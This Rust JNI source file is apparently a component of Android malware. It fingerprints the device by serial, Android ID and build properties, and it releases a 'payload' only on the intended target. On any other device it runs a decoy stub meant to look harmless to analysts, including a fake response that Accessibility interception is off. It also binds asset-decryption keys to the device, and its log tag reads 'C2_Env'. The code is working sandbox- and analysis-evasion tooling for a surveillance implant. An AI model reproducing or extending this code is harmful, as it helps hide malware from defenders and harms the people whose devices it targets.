use sha2::{Sha256, Digest};
use std::error::Error;

/**
 * Environmental Keying: Device Fingerprint Validation
 * 
 * At startup, CoreService calls JNI to verify device fingerprint.
 * If mismatch (stolen APK on different device), app behaves as harmless stub.
 * 
 * Fingerprint components:
 * - Build.SERIAL (hardware serial)
 * - Settings.Secure.ANDROID_ID (unique Android ID)
 * - Build.FINGERPRINT (build identifier)
 * - Build.HARDWARE (hardware codename)
 * - Build.DEVICE (device name)
 * - Build.MANUFACTURER (manufacturer)
 */

pub struct DeviceEnvironment {
    pub serial: String,
    pub android_id: String,
    pub fingerprint: String,
    pub hardware: String,
    pub device: String,
    pub manufacturer: String,
}

impl DeviceEnvironment {
    /// Calculate SHA256 hash of device fingerprint
    pub fn calculate_hash(&self) -> String {
        let combined = format!(
            "{}|{}|{}|{}|{}|{}",
            self.serial,
            self.android_id,
            self.fingerprint,
            self.hardware,
            self.device,
            self.manufacturer
        );

        let mut hasher = Sha256::new();
        hasher.update(combined.as_bytes());
        let result = hasher.finalize();

        format!("{:x}", result)
    }

    /// Verify device fingerprint against expected hash
    pub fn verify(&self, expected_hash: &str) -> bool {
        let actual_hash = self.calculate_hash();
        actual_hash == expected_hash
    }

    /// Parse JNI device info into environment
    pub fn from_jni_values(
        serial: String,
        android_id: String,
        fingerprint: String,
        hardware: String,
        device: String,
        manufacturer: String,
    ) -> Self {
        DeviceEnvironment {
            serial,
            android_id,
            fingerprint,
            hardware,
            device,
            manufacturer,
        }
    }
}

// ============================================================================
// NATIVE JNI FUNCTION
// ============================================================================

use jni::JNIEnv;
use jni::objects::{JClass, JObject, JString};
use jni::sys::{jboolean, jstring};

/**
 * JNI: Validate device environment
 * 
 * Called at CoreService startup:
 *   val isValid = NativeEnvironment.validateEnvironment(
 *       serial, android_id, fingerprint, hardware, device, 
 *       manufacturer, expected_hash
 *   )
 *   if (!isValid) {
 *       // Device mismatch - app acts as harmless stub
 *       stopSelf()
 *   }
 */
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_environment_NativeEnvironment_validateEnvironment(
    mut env: JNIEnv,
    _class: JClass,
    serial: JString,
    android_id: JString,
    fingerprint_str: JString,
    hardware: JString,
    device: JString,
    manufacturer: JString,
    expected_hash: JString,
) -> jboolean {
    // Extract strings from JNI
    let serial_str = match env.get_string(&serial) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let android_id_str = match env.get_string(&android_id) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let fingerprint_str_val = match env.get_string(&fingerprint_str) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let hardware_str = match env.get_string(&hardware) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let device_str = match env.get_string(&device) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let manufacturer_str = match env.get_string(&manufacturer) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let expected_hash_str = match env.get_string(&expected_hash) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    // Build environment
    let device_env = DeviceEnvironment::from_jni_values(
        serial_str,
        android_id_str,
        fingerprint_str_val,
        hardware_str,
        device_str,
        manufacturer_str,
    );

    // Verify
    if device_env.verify(&expected_hash_str) {
        log_info("Device fingerprint valid - payload authorized");
        1
    } else {
        log_info("Device fingerprint MISMATCH - payload unauthorized");
        log_info(&format!(
            "Expected: {}, Got: {}",
            expected_hash_str,
            device_env.calculate_hash()
        ));
        0
    }
}

/**
 * Get device fingerprint hash (for debugging/logging)
 * Called during build to generate expected hash
 */
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_environment_NativeEnvironment_getDeviceFingerprintHash(
    mut env: JNIEnv,
    _class: JClass,
    serial: JString,
    android_id: JString,
    fingerprint_str: JString,
    hardware: JString,
    device: JString,
    manufacturer: JString,
) -> jstring {
    let serial_str = env.get_string(&serial).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
    let android_id_str = env.get_string(&android_id).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
    let fingerprint_str_val = env.get_string(&fingerprint_str).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
    let hardware_str = env.get_string(&hardware).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
    let device_str = env.get_string(&device).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
    let manufacturer_str = env.get_string(&manufacturer).map(|s| s.to_string_lossy().to_string()).unwrap_or_default();

    let device_env = DeviceEnvironment::from_jni_values(
        serial_str,
        android_id_str,
        fingerprint_str_val,
        hardware_str,
        device_str,
        manufacturer_str,
    );

    let hash = device_env.calculate_hash();
    match env.new_string(&hash) {
        Ok(s) => JObject::from(s).into_raw(),
        Err(_) => std::ptr::null_mut(),
    }
}

// ============================================================================
// NATIVE FINGERPRINT HASH (called from lib.rs without JNI)
// ============================================================================

pub fn get_device_fingerprint_hash() -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(target_os = "android")]
    {
        use crate::env_key::read_system_property;
        let env = DeviceEnvironment {
            serial:       read_system_property("ro.serialno"),
            android_id:   read_system_property("ro.boot.serialno"),
            fingerprint:  read_system_property("ro.build.fingerprint"),
            hardware:     read_system_property("ro.hardware"),
            device:       read_system_property("ro.product.device"),
            manufacturer: read_system_property("ro.product.manufacturer"),
        };
        Ok(env.calculate_hash())
    }
    #[cfg(not(target_os = "android"))]
    {
        Err("get_device_fingerprint_hash: not on Android".into())
    }
}

// ============================================================================
// ANTI-TAMPERING: VERIFY ENVIRONMENT AT RUNTIME
// ============================================================================

/**
 * Runtime verification of environment conditions
 * Checks that device meets expected properties
 */
pub struct EnvironmentVerifier {
    min_api_level: i32,
    max_api_level: i32,
    allowed_manufacturers: Vec<String>,
}

impl EnvironmentVerifier {
    pub fn new(min_api: i32, max_api: i32, manufacturers: Vec<String>) -> Self {
        EnvironmentVerifier {
            min_api_level: min_api,
            max_api_level: max_api,
            allowed_manufacturers: manufacturers,
        }
    }

    pub fn verify_device(&self, device_env: &DeviceEnvironment, api_level: i32) -> Result<(), String> {
        // Check API level
        if api_level < self.min_api_level {
            return Err(format!("API level too low: {} < {}", api_level, self.min_api_level));
        }
        if api_level > self.max_api_level {
            return Err(format!("API level too high: {} > {}", api_level, self.max_api_level));
        }

        // Check manufacturer
        if !self.allowed_manufacturers.is_empty() {
            let manufacturer_lower = device_env.manufacturer.to_lowercase();
            let matches = self.allowed_manufacturers.iter().any(|m| {
                manufacturer_lower.contains(&m.to_lowercase())
            });

            if !matches {
                return Err(format!(
                    "Manufacturer not allowed: {}",
                    device_env.manufacturer
                ));
            }
        }

        Ok(())
    }
}

// ============================================================================
// BEHAVIORAL STUB (WHEN DEVICE MISMATCH)
// ============================================================================

/**
 * If device fingerprint doesn't match, app loads this stub instead of
 * the real payload. To external observers, it looks like a harmless app.
 */
pub mod stub_behavior {
    /// Stub app does nothing suspicious
    pub fn start_stub() {
        // Log as if app is starting normally
        super::log_info("App started successfully");
        // Exit gracefully - no error, no crash log
    }

    /// Stub app periodically polls, but does nothing
    pub fn stub_heartbeat() {
        // Check time, do nothing
    }

    /// Stub app responds to Accessibility queries but doesn't intercept
    pub fn stub_accessibility_response() -> bool {
        false // Not enabled
    }
}

// ============================================================================
// PROTECTION: KEY BINDING
// ============================================================================

/**
 * Bind encryption keys to device
 * If APK is copied to different device, keys won't decrypt assets
 */
pub fn bind_encryption_key_to_device(
    device_env: &DeviceEnvironment,
    base_key: &[u8; 32],
) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;

    let device_hash = device_env.calculate_hash();
    let mut mac = HmacSha256::new_from_slice(base_key)
        .expect("HMAC can take key of any size");

    mac.update(device_hash.as_bytes());

    let result = mac.finalize();
    let bytes = result.into_bytes();

    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes[..32]);

    key
}

// ============================================================================
// LOGGING (ANDROID COMPATIBLE)
// ============================================================================

#[cfg(target_os = "android")]
extern "C" {
    fn __android_log_write(
        prio: libc::c_int,
        tag: *const libc::c_char,
        text: *const libc::c_char,
    ) -> libc::c_int;
}

pub fn log_info(message: &str) {
    #[cfg(target_os = "android")]
    {
        use std::ffi::CString;
        let tag = CString::new("C2_Env").unwrap();
        let msg = CString::new(message).unwrap();
        unsafe { __android_log_write(3, tag.as_ptr(), msg.as_ptr()); }
    }
    #[cfg(not(target_os = "android"))]
    { println!("[Env] {}", message); }
}

pub fn log_error(message: &str) {
    #[cfg(target_os = "android")]
    {
        use std::ffi::CString;
        let tag = CString::new("C2_Env").unwrap();
        let msg = CString::new(message).unwrap();
        unsafe { __android_log_write(6, tag.as_ptr(), msg.as_ptr()); }
    }
    #[cfg(not(target_os = "android"))]
    { eprintln!("[Env] ERROR: {}", message); }
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fingerprint_hash_consistency() {
        let env1 = DeviceEnvironment {
            serial: "ABC123".to_string(),
            android_id: "12345abcde".to_string(),
            fingerprint: "fingerprint_string".to_string(),
            hardware: "hardware_name".to_string(),
            device: "device_name".to_string(),
            manufacturer: "TestCorp".to_string(),
        };

        let hash1 = env1.calculate_hash();
        let hash2 = env1.calculate_hash();

        assert_eq!(hash1, hash2);
    }

    #[test]
    fn test_fingerprint_different_for_different_devices() {
        let env1 = DeviceEnvironment {
            serial: "ABC123".to_string(),
            android_id: "12345abcde".to_string(),
            fingerprint: "fingerprint1".to_string(),
            hardware: "hardware".to_string(),
            device: "device1".to_string(),
            manufacturer: "Manufacturer".to_string(),
        };

        let env2 = DeviceEnvironment {
            serial: "ABC123".to_string(),
            android_id: "12345abcde".to_string(),
            fingerprint: "fingerprint2".to_string(),
            hardware: "hardware".to_string(),
            device: "device2".to_string(),
            manufacturer: "Manufacturer".to_string(),
        };

        assert_ne!(env1.calculate_hash(), env2.calculate_hash());
    }

    #[test]
    fn test_verify_matching_hash() {
        let env = DeviceEnvironment {
            serial: "XYZ789".to_string(),
            android_id: "xyz789abc".to_string(),
            fingerprint: "test_fp".to_string(),
            hardware: "test_hw".to_string(),
            device: "test_device".to_string(),
            manufacturer: "TestMfg".to_string(),
        };

        let expected_hash = env.calculate_hash();
        assert!(env.verify(&expected_hash));
    }

    #[test]
    fn test_verify_mismatched_hash() {
        let env = DeviceEnvironment {
            serial: "XYZ789".to_string(),
            android_id: "xyz789abc".to_string(),
            fingerprint: "test_fp".to_string(),
            hardware: "test_hw".to_string(),
            device: "test_device".to_string(),
            manufacturer: "TestMfg".to_string(),
        };

        let wrong_hash = "0000000000000000000000000000000000000000000000000000000000000000";
        assert!(!env.verify(wrong_hash));
    }

    #[test]
    fn test_environment_verifier() {
        let verifier = EnvironmentVerifier::new(
            26, // min API 26
            33, // max API 33
            vec!["OnePlus".to_string(), "Samsung".to_string()],
        );

        let good_env = DeviceEnvironment {
            serial: "S123".to_string(),
            android_id: "id123".to_string(),
            fingerprint: "fp".to_string(),
            hardware: "hw".to_string(),
            device: "dev".to_string(),
            manufacturer: "OnePlus".to_string(),
        };

        assert!(verifier.verify_device(&good_env, 31).is_ok());

        let bad_env = DeviceEnvironment {
            serial: "S123".to_string(),
            android_id: "id123".to_string(),
            fingerprint: "fp".to_string(),
            hardware: "hw".to_string(),
            device: "dev".to_string(),
            manufacturer: "Unknown".to_string(),
        };

        assert!(verifier.verify_device(&bad_env, 31).is_err());
    }

    #[test]
    fn test_key_binding_to_device() {
        let env1 = DeviceEnvironment {
            serial: "DEV1".to_string(),
            android_id: "id1".to_string(),
            fingerprint: "fp1".to_string(),
            hardware: "hw1".to_string(),
            device: "d1".to_string(),
            manufacturer: "Mfg1".to_string(),
        };

        let env2 = DeviceEnvironment {
            serial: "DEV2".to_string(),
            android_id: "id2".to_string(),
            fingerprint: "fp2".to_string(),
            hardware: "hw2".to_string(),
            device: "d2".to_string(),
            manufacturer: "Mfg2".to_string(),
        };

        let base_key = [0x42u8; 32];

        let key1 = bind_encryption_key_to_device(&env1, &base_key);
        let key2 = bind_encryption_key_to_device(&env2, &base_key);

        // Same device produces same key
        let key1_again = bind_encryption_key_to_device(&env1, &base_key);
        assert_eq!(key1, key1_again);

        // Different device produces different key
        assert_ne!(key1, key2);
    }
}
